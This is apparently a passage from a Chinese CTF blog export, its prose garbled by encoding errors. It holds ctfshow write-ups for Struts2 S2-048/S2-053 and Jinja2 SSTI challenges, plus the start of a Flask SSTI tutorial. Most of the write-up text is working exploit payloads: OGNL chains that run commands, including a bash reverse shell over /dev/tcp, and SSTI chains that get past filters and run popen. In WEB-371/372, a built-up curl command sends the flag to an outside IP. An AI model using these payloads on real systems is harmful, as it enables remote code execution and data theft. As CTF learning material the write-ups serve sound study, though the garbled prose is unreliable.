WEB-295(S2-048)\n\nåˆæ˜¯showcaseäº†\n\nåŸç†:\n\næ¼æ´ä¸»è¦é—®é¢˜å‡ºåœ¨struts2-struts1-pluginè¿™ä¸ªæ’ä»¶åŒ…ä¸Šã€‚è¿™ä¸ªåº“çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†struts1çš„actionå°è£…æˆstruts2çš„actionä»¥ä¾¿å®ƒèƒ½åœ¨strut2ä¸Šè¿è¡Œä½¿ç”¨\n\nè€Œç”±äºstruts2-struts1-plugin åŒ…ä¸­çš„ â€œStruts1Action.javaâ€ ä¸­çš„ execute å‡½æ•°å¯ä»¥è°ƒç”¨ getText() å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆšå¥½åˆèƒ½æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼ŒåŒæ—¶è¿™ä¸ª getText() çš„ å‚æ•°è¾“å…¥ç‚¹ï¼Œåˆå¯ä»¥è¢«ç”¨æˆ·ç›´æ¥è¿›è¡Œæ§åˆ¶ï¼Œå¦‚æœè¿™ä¸ªç‚¹è¢«æ¶æ„æ”»å‡»è€…æ‰€æ§åˆ¶ï¼Œå°±å¯ä»¥æ„é€ æ¶æ„æ‰§è¡Œä»£ç ï¼Œä»è€Œå®ç°ä¸€ä¸ªRCEæ”»å‡»\n\nå½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.32\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963120663-1045940c-f911-4e1d-af71-a1808e8f746d.png)\n\næˆåŠŸæ‰§è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963158825-e4b7adae-128b-4bdf-b248-2c600091a40c.png)\n\npayload:\n\n```plain\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())).(#q)}\n```\n\næ³¨å…¥ç‚¹åœ¨ç¬¬ä¸€ä¸ªæ é‡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963566791-1536b3ed-3280-40e4-9a99-55dbe5916d98.png)\n\nflagå°±æ˜¯è¿™æ®µ å› ä¸ºå®ƒæŠ¥é”™ä¸èƒ½è§£ææˆ‘ä»¬çš„uuid\n\n# WEB-296(S2-052)\n\nè¿™é¢˜ç›´æ¥ç”¨è„šæœ¬pocæ‰“å°±è¡Œäº† çœ‹å¥½å¤šå¸ˆå‚…payloadæ‰“ä¸äº†\n\n# WEB-297(S2-053)\n\nåŸç†:\n\nStruts2åœ¨ä½¿ç”¨Freemarkeræ¨¡æ¿å¼•æ“çš„æ—¶å€™ï¼ŒåŒæ—¶å…è®¸è§£æOGNLè¡¨è¾¾å¼ã€‚å¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœ¬èº«ä¸ä¼šè¢«OGNLè§£æï¼Œä½†ç”±äºè¢«Freemarkerè§£æä¸€æ¬¡åå˜æˆç¦»å¼€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¢«OGNLè§£æç¬¬äºŒæ¬¡ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´\n\npayloadï¼š\n\n```plain\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/ip/port 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n```\n\nç›´æ¥rce envæ‰¾ä¸åˆ°flag åå¼¹shell envæ‰æœ‰flag é€†å¤©\n\n# åè¨€\n\nä¹Ÿå°±å½“ä½œæ˜¯ç†Ÿæ‚‰äº† åªæ˜¯payloadçš„æ¬è¿å·¥:)\n","categories":["ctfshow"]},{"title":"ctfshow-ssti","url":"/post/7eb33f7a.html","content":"\nctfshow-ssti\n\n<!--more-->\n\næ„Ÿè§‰è¿™å—ç½‘ä¸Šç›´æ¥æ‰¾payloadä¹‹å¤– æ²¡æœ‰çœŸæ­£ç†è§£ç­”æ¡ˆ é‡æ–°å­¦ä¹ ä¸€ä¸‹ é¡ºä¾¿ä¹Ÿè¦é€‚åº”pythonäº†\n\n# WEB-361\n\næ— è¿‡æ»¤\n\npayload:`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}`\n\næˆ–è€…ç”¨lipsumåŒ…å’Œcycleråº“\n\n```python\n?name={{lipsum.__globals__['os'].popen('tac ../flag').read()}}\n?name={{cycler.__init__.__globals__.os.popen('ls').read()}}\n```\n\næˆ–è€…ç”¨æ§åˆ¶å—\n\n```python\n?name={% print(url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat ../flag').read()\"))%}\n```\n\n# WEB-362(è¿‡æ»¤äº†os.wrap_close)\n\nç”¨ä¸Šä¸€é¢˜çš„å…¶ä»–æ–¹å¼å°±è¡Œ\n\n# WEB-363(è¿‡æ»¤å•åŒå¼•å·)\n\ngetä¼ å‚æ–¹å¼ç»•è¿‡æˆ–`request.cookies.x`éƒ½è¡Œ\n\néœ€è¦æ³¨æ„çš„æ˜¯`url_for.__builtins__`ä¸‹æ²¡æœ‰os ä½†æ˜¯å¯ä»¥ç”¨eval\n\n```python\n?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag\n?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag\n?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()\n```\n\nè¿˜æœ‰å°±æ˜¯é€šè¿‡configé…ç½®ä¿¡æ¯æˆªå­—ç¬¦ æˆªå–åˆ°os\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png)\n\n`?name={{url_for.__globals__[(config.__str__()[2])%2b(config.__str__()[42])]}}`è¿™é‡Œéœ€è¦æ³¨æ„å°±æ˜¯`%2b`æ˜¯ `+`çš„urlç¼–ç  ä¸åŠ çš„è¯å°±ä¼šæŠ¥é”™\n\n# WEB-364(è¿‡æ»¤äº†args)\n\n\n\nä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½getä¼ å‚äº†ç›´æ¥banäº† `request.args` å…¶å®è¿˜å¯ä»¥ç”¨cookie\n\n```python\n?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\ncookie ä¼ å‚:a=os;b=popen;c=cat /flag\n```\n\nç¬¬äºŒç§ï¼š\n\nvalueså¯ä»¥è·å–æ‰€æœ‰å‚æ•° ç»•è¿‡args\n\n```\n?name={{lipsum.__globals__.os.popen(request.values.x).read()}}&x=cat /flag\n```\n\n# WEB-365(è¿‡æ»¤äº†æ–¹æ‹¬å·)\n\n## payload_1\n\nvaluesä¼ å‚\n\nvalues æ²¡æœ‰è¢«è¿‡æ»¤\n\n```\n?name={{lipsum.__globals__.os.popen(request.values.x).read()}}&x=cat /flag\n```\n\næˆ–è€…cookieéƒ½è¡Œ\n\n## payload_2\n\nå­—ç¬¦ä¸²æ‹¼æ¥\n\n`[]`å¯ä»¥ç”¨`.`æˆ–è€…`__getitem__`æœ¬è´¨å°±æ˜¯å®ƒ\n\nå…¶ä»–å¸ˆå‚…çš„è„šæœ¬å¦‚ä¸‹:\n\n```python\n# anthor:ç§€å„¿\nimport requests\nurl=\"http://bbb42674-c33e-4370-b602-c3318e79fa64.challenge.ctf.show/?name={{config.__str__().__getitem__(%d)}}\"\n\npayload=\"cat /flag\"\nresult=\"\"\nfor j in payload:\n    for i in range(0,1000):\n        r=requests.get(url=url%(i))\n        location=r.text.find(\"<h3>\")\n        word=r.text[location+4:location+5]\n        if word==j:\n            print(\"config.__str__().__getitem__(%d) == %s\"%(i,j))\n            result+=\"config.__str__().__getitem__(%d)~\"%(i)\n            break\nprint(result[:len(result)-1])\n```\n\nç„¶åç”¨`~`è¿æ¥èµ·æ¥\n\n```python\n?name={{url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)\n).read()}}\n```\n\n# WEB-366(è¿‡æ»¤äº†ä¸‹åˆ’çº¿)\n\nå¯ä»¥ç”¨è¿‡æ»¤å™¨\n\n```python\n?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\ncookie:a=__globals__;b=cat /flag\n```\n\n# WEB-367(è¿‡æ»¤äº†os)\n\n```python\n?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag\n```\n\n`lipsum.__globals__.get(os).popen(c=cat /flag)`æœ€ç»ˆæ„é€ æ˜¯è¿™ä¸ª\n\nç”±äº`[]`ä¹Ÿæ˜¯è¢«wafäº†æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡get(os)æ–¹å¼ ä¹‹å‰æˆ‘ä»¬éƒ½æ˜¯`lipsum.__globals__['os']`\n\nä¹Ÿç®—æ˜¯ä¸€ä¸ªå°trick\n\n# WEB-368(è¿‡æ»¤äº†å·¦èŠ±æ‹¬å·)\n\nç”¨`{%print()%}`\n\n```python\n?name={%print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%}&a=__globals__&b=os&c=cat /flag\n```\n\n# WEB-369(è¿‡æ»¤äº†request)\n\n## payload_1\n\næˆªå–é…ç½®configæ„é€  è¿™ç±»ä¸‹åˆ’çº¿è¢«banäº† ä¸èƒ½ç”¨`__str()__`\tæ‰€ä»¥å°±è¦ç”¨è¿‡æ»¤å™¨äº†\n\nè·å–å­—ç¬¦ä¸²åæœ¬æ¥è¦ç”¨`__getitem__`é—®é¢˜æ˜¯`_`è¢«banäº†\n\næ‰€ä»¥è¿™é‡Œéœ€è¦è½¬æ¢æˆlistç„¶åç”¨`pop()`å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦\n\nå¸ˆå‚…ä»¬çš„payload:\n\n```python\n?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()\n)).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}\n```\n\nå¯ä»¥æ¥å‰–æä¸€ä¸‹\n\næ€»ä½“æ˜¯ç”¨`(config|string|list).pop(ä¸‹æ ‡).lower()`è¿™ç§æ–¹å¼å»æˆªå–æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦\n\nç„¶åè½¬ä¸ºå°å†™ ç”¨`~`è¿æ¥èµ·æ¥ è¿™é‡Œè¿˜æ˜¯å­˜åœ¨é‚£ä¸ªtrick è¦ç”¨`get('os')`å»ä»£æ›¿`['os']`å› ä¸ºæ–¹æ‹¬å·è¢«banäº†\n\n## payload_2\n\n```python\n?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{%print(x.open(file).read())%}\n```\n\nè§£é‡Š\n\n```python\næ„é€ po=\"pop\"     #åˆ©ç”¨dict()|joinæ‹¼æ¥å¾—åˆ°\n{% set po=dict(po=a,p=a)|join%}  #po=pop\n \nç­‰æ•ˆäºa=(()|select|string|list).pop(24),å³aç­‰ä»·äºä¸‹åˆ’çº¿_\n{% set a=(()|select|string|list)|attr(po)(24)%} #a=_\n \næ„é€ ini=\"___init__\"\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}#å…ƒç»„å¯ä»¥ä¸€å±‚ä¸€å±‚çœ‹å¥½ç†è§£ini=__init__ ç”¨äº†ä¸¤ä¸ªjoin\n \næ„é€ glo=\"__globals__\"\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n \næ„é€ geti=\"__getitem__\"\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n \næ„é€ built=\"__builtins__\"\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n \nè°ƒç”¨chr()å‡½æ•°  æ³¨æ„è¿™é‡Œqå–ä»»ä½•å€¼éƒ½è¡Œ æ²¡æœ‰ç‰¹åˆ«çš„æ„ä¹‰\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}#x=q.__init__.globals__.__getitem__(__builtins__)\n{% set chr=x.chr%}#chr=q.__init__.globals__.__getitem__(__builtins__).chr \n \næ„é€ file='/flag'\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}# %2bæ˜¯+ ä¸€å®šè¦æœ‰\n```\n\n# WEB-370(è¿‡æ»¤æ•°å­—)\n\nä¸»è¦æ€è·¯æ˜¯å°±æ˜¯ç”¨countè¿‡æ»¤å™¨æ­é…joinè®¡ç®—å­—ç¬¦é•¿åº¦è·å–æ•°å­— ç„¶åæ€è·¯å’Œä¸Šä¸€é¢˜ä¸€æ ·\n\npayload:\n\n```python\n{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}\n{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}\n{%set x=(()|select|string|list).pop(num)%}\n{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}\n{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}\n{%set c = dict(chr=a)|join%}\n{%set o = dict(o=a,s=a)|join%}\n{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}\n{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}\n{%set file = chr(numm)~dict(flag=a)|join%}\n{%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%}\n```\n\n# WEB-371(è¿‡æ»¤printæ— å›æ˜¾)\n\n```python\n/?name=\n{%set z=dict()|join|count%}\n{%set e=dict(a=a)|join|count%}\n{%set ee=dict(aa=a)|join|count%}\n{%set eee=dict(aaa=a)|join|count%}\n{%set eeee=dict(aaaa=a)|join|count%}\n{%set eeeee=dict(aaaaa=a)|join|count%}\n{%set eeeeee=dict(aaaaaa=a)|join|count%}\n{%set eeeeeee=dict(aaaaaaa=a)|join|count%}\n{%set eeeeeeee=dict(aaaaaaaa=a)|join|count%}\n{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|count%}\n{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|count%}\n{%set dayu=(()|select|string|list).pop()%}\n{% set space=(()|select|string|list).pop(eeeee*ee)%}\n{% set xhx=(()|select|string|list).pop(eee*eeeeeeeee) %}\n{% set point=(config|string|list).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %}\n{% set maohao=(config|string|list).pop(ee*eeeeeee) %}\n{% set xiegang=(config|string|list).pop(-eeeeeeee*eeeeeeee) %}\n{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}\n{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}\n{% set ohs=dict(o=z,s=z)|join %}\n{% set open=(lipsum|attr(globals)).get(builtins).open %}\n{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}\n{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %}\n{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}\n```\n\nå…ˆæ„é€ å‡ºæ•°å­—0-9 ç„¶åå»æˆªå–æˆ‘ä»¬æƒ³è¦çš„ç¬¦å· ç”¨curlå¤–å¸¦flag\n\næ„é€ å‡º`curl http://ip:port/`\n\nä¸€å¼€å§‹è‡ªå·±ä¸€ç›´åœ¨æ„é€ bashåå¼¹shellçš„ æ„é€ äº†è€åŠå¤© mdå‘ç°`-&`æˆªå–ä¸åˆ° æ²¡æœ‰è¿™ä¸¤ä¸ªç¬¦å· å¤ªéš¾è¿‡äº† ä¸è¿‡å¯¹è¿‡ç¨‹æœ‰äº†æ›´æ·±çš„ç†è§£äº†\n\n# WEB-372(è¿‡æ»¤äº†count)\n\nç”¨lengthæ›¿æ¢å°±è¡Œäº† ç„¶åç»§ç»­curlå¤–å¸¦\n\nå’Œä¸Šé¢payloadå·®ä¸å¤š\n\n```python\n/?name=\n{%set z=dict()|join|length%}\n{%set e=dict(a=a)|join|length%}\n{%set ee=dict(aa=a)|join|length%}\n{%set eee=dict(aaa=a)|join|length%}\n{%set eeee=dict(aaaa=a)|join|length%}\n{%set eeeee=dict(aaaaa=a)|join|length%}\n{%set eeeeee=dict(aaaaaa=a)|join|length%}\n{%set eeeeeee=dict(aaaaaaa=a)|join|length%}\n{%set eeeeeeee=dict(aaaaaaaa=a)|join|length%}\n{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|length%}\n{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|length%}\n{%set dayu=(()|select|string|list).pop()%}\n{% set space=(()|select|string|list).pop(eeeee*ee)%}\n{% set xhx=(()|select|string|list).pop(eee*eeeeeeeee) %}\n{% set point=(config|string|list).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %}\n{% set maohao=(config|string|list).pop(ee*eeeeeee) %}\n{% set xiegang=(config|string|list).pop(-eeeeeeee*eeeeeeee) %}\n{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}\n{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}\n{% set ohs=dict(o=z,s=z)|join %}\n{% set open=(lipsum|attr(globals)).get(builtins).open %}\n{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}\n{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %}\n{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}\n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692699535461-6fe5aca5-bfd2-406e-aef9-9ec52ed5e842.png)\n\n# åè¨€ \n\nè™½ç„¶è¿™æ˜¯ä¸€ä¸ªè€ç”Ÿå¸¸è°ˆçš„é¢˜ç›® ä½†æ˜¯è‡ªå·±å¯¹payloadä¸å¤ªç†è§£ è¿™æ¬¡åˆ·è¿‡ä¹‹å ä¼šå¥½å¾ˆå¤š ä¸è‡³äºçœ‹ä¸æ‡‚ å†²å°±å®Œäº†\n","categories":["ctfshow"]},{"title":"Flask SSTIç®€å•å­¦ä¹ ","url":"/post/c52c3ed.html","content":"\nFlask SSTI\n\n<!--more-->\n\n# SSTIå‰ç½®çŸ¥è¯†\n\n```python\n{%%}å¯ä»¥ç”¨æ¥å£°æ˜å˜é‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ã€‚\n{{}}ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º\n{##}è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š\n##å¯ä»¥æœ‰å’Œ{%%}ç›¸åŒçš„æ•ˆæœ\n```\n\näº†è§£ä¸€äº›pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»\n\n## __class__\n\nè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±» \n\n```python\n>>>''.__class__ #''é‡Œé¢æ˜¯å­—ç¬¦ä¸²ç±»å‹\n<class 'str'>\n>>>().__class__\n<class 'tuple'> #()é‡Œé¢æ˜¯å…ƒç»„ç±»å‹\n```\n\n## __base__å’Œ__bases__\n\néƒ½æ˜¯ç”¨äºè·å–ç±»çš„åŸºç±» åŸºç±»ä¹Ÿå«çˆ¶ç±»\n\nä½†æ˜¯baseæ˜¯ä»¥å­—ç¬¦ä¸²å½¢å¼ è€Œbasesä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥é›†æˆçš„ç±»\n\n```python\n>>> \"\".__class__\n<class 'str'>\n>>> \"\".__class__.__base__\n<class 'object'>\n//objectä¸ºstrçš„åŸºç±»\n>>>\"\".__class__.__bases__\n(<class 'object'>,)\n```\n\n## __mro__\n\nè¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåº\n\nï¼ˆå½“è°ƒç”¨_mro_[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº_base_ï¼‰\n\n```python\n>>> \"\".__class__.__mro__\n(<class 'str'>, <class 'object'>)\n>>> \"\".__class__.__mro__[1]\n<class 'object'>\n>>> \"\".__class__.__mro__[-1]\n<class 'object'>\n```\n\n## __subclasses__()\n\nè·å–ç±»çš„æ‰€æœ‰å­ç±»\n\nè¿™é‡Œéœ€è¦çŸ¥é“objectæ˜¯æ‰€æœ‰ç±»çš„åŸºç±»\n\næ‰€ä»¥objectä¸‹å­ç±»æ˜¯æ‰€æœ‰ç±»\n\n```python\n>>>\"\".__class__.__base__.__subclasses__()\nå¯ä»¥è·å–åˆ°å¾ˆå¤šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç±» ç„¶åé€šè¿‡[]ç´¢å¼•ä¸‹æ ‡æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„ç±»\n```\n\n## __init__\n\næ‰€æœ‰å¯è¢«å½“ä½œæ¨¡æ¿å¯¼å…¥çš„éƒ½åŒ…å«__init__æ–¹æ³•ï¼Œé€šè¿‡æ­¤æ–¹æ³•æ¥è°ƒç”¨__globals__æ–¹æ³•\n\n## __globals__\n\nè¯¥æ–¹æ³•ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ä½ç½®çš„æ‰€æœ‰å…¨å±€å˜é‡\n\næ‰€æœ‰å‡½æ•°éƒ½ä¼šæœ‰ä¸€ä¸ª __globals__ å±æ€§ï¼Œ ç”¨äºè·å–å½“å‰ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„æ¨¡å—ã€æ–¹æ³•åŠå…¶æ‰€æœ‰å˜é‡ï¼Œç»“æœæ˜¯ä¸€ä¸ªå­—å…¸\n\n## __builtins__\n\n### python2 ä¸­ä¸º__bulitins__å’Œ__bulitin__\n\n__builtins__ å®é™…ä¸Šæ˜¯ä¸€ä¸ªæŒ‡å‘æˆ–è€…è¯´å¼•ç”¨ __builtin__ çš„ï¼ˆæœ‰ç‚¹ç±»ä¼¼äºè½¯é“¾æ¥ï¼‰\n\nè¿™é‡Œ __builtins__ æ˜¯å†…å»ºåç§°ç©ºé—´ï¼Œæ˜¯è¿™ä¸ªæ¨¡å—æœ¬èº«å®šä¹‰çš„ä¸€ä¸ªåç§°ç©ºé—´ï¼Œåœ¨è¿™ä¸ªå†…å»ºåç§°ç©ºé—´ä¸­å­˜åœ¨ä¸€äº›æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„å†…ç½®å‡½æ•°ï¼ˆå³ä¸éœ€è¦å¯¼å…¥åŒ…å³å¯è°ƒç”¨çš„å‡½æ•°ï¼‰å¦‚ï¼šprint()ã€str()è¿˜åŒ…æ‹¬ä¸€äº›å¼‚å¸¸å’Œå…¶ä»–å±æ€§ã€‚\n\n### python3ä¸­ä¸º__builtins__å’Œbuiltins\n\n builtins ä»£æ›¿çš„ __builtin__\n\nåœ¨pythonä¸­æœ‰ä¸€äº›BIFï¼ˆå†…ç½®å‡½æ•°ï¼‰æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨çš„ï¼Œæ¯”å¦‚str(), print()ç­‰ï¼Œè¿™äº›å‡½æ•°å¯ä»¥é€šè¿‡ dir(__builtins__) å¯ä»¥æŸ¥åˆ°ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692343076146-0d66b0c5-04a0-4eb6-8136-666e07389d06.png)\n\n## __import__()\n\nè¯¥æ–¹æ³•ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•° å¦‚æœä¸€ä¸ªæ¨¡å—ç»å¸¸å˜åŒ–å°±å¯ä»¥ä½¿ç”¨__import__()æ¥åŠ¨æ€è½½å…¥ è¯­æ³•`__import__(æ¨¡å—å)`\n\næ€»ä½“æ€è·¯å°±æ˜¯ï¼š\n\n```python\næ‰¾åˆ°çˆ¶ç±»<type 'object'> ---> å¯»æ‰¾å­ç±» ---> æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚\n```\n\n# è¿‡æ»¤å™¨\n\nå˜é‡å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨ä¿®æ”¹ã€‚è¿‡æ»¤å™¨ä¸å˜é‡ä¹‹é—´ç”¨ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰éš”å¼€ï¼Œæ‹¬å·ä¸­å¯ä»¥æœ‰å¯é€‰å‚æ•°\n\nå¯ä»¥é“¾æ¥å¤š ä¸ªè¿‡æ»¤å™¨\n\nä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚\n\n## attr()\n\nç”¨äºè·å–å¯¹è±¡çš„å±æ€§\n\n```python\n\"\"|attr(\"__class__\")\nç›¸å½“äº\n\"\".__class__\n```\n\nå¸¸è§äºç‚¹å·`.`è¢«è¿‡æ»¤ï¼Œæˆ–è€…ç‚¹å·`.`å’Œä¸­æ‹¬å·`[]`éƒ½è¢«è¿‡æ»¤çš„æƒ…å†µ\n\n## format()\n\nç®€å•ç†è§£å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦\n\n```python\n\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)  #ç›¸å½“äº__class__\n```\n\n## first() last() random()\n\nè¿”å›ç¬¬ä¸€ä¸ªå€¼ æœ€åä¸€ä¸ªå€¼æˆ–è€…éšæœº \n\néšæœºçš„è¯éœ€è¦æˆ‘ä»¬è·‘ä¸ªè„šæœ¬å°±æœ‰å‡ ç‡è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹äº†\n\n```python\n>>>\"\".__class__.__base__.__subclasses__()|first()\n<class 'type'>\n>>>\"\".__class__.__base__.__subclasses__()|last()\n<class 'jinja2.ext._CommentFinder'>\n>>>\"\".__class__.__base__.__subclasses__()|random()\n<class 'wrapper_descriptor'>\n```\n\n## join()\n\nå­—ç¬¦ä¸²æ‹¼æ¥\n\n```python\n\"\"[['__clas','s__']|join] æˆ–è€… \"\"[('__clas','s__')|join]\nç›¸å½“äº\n\"\"[\"__class__\"]\n```\n\n## lower()\n\nè½¬åŒ–ä¸ºå°å†™\n\n```python\n>>>\"\"[\"__CLASS__\"|lower()]\n<class 'str'>\n```\n\n\n\n## replace() reverse()\n\næ›¿æ¢å’Œåè½¬è¿˜åŸå›æˆ‘ä»¬è¦ç”¨çš„å­—ç¬¦ä¸²\n\n```python\n\"__claee__\"|replace(\"ee\",\"ss\") æ„é€ å‡ºå­—ç¬¦ä¸² \"__class__\"\n\"__ssalc__\"|reverse æ„é€ å‡º \"__class__\"\n```\n\n## string\n\nåŠŸèƒ½ç±»ä¼¼äºpythonå†…ç½®å‡½æ•° 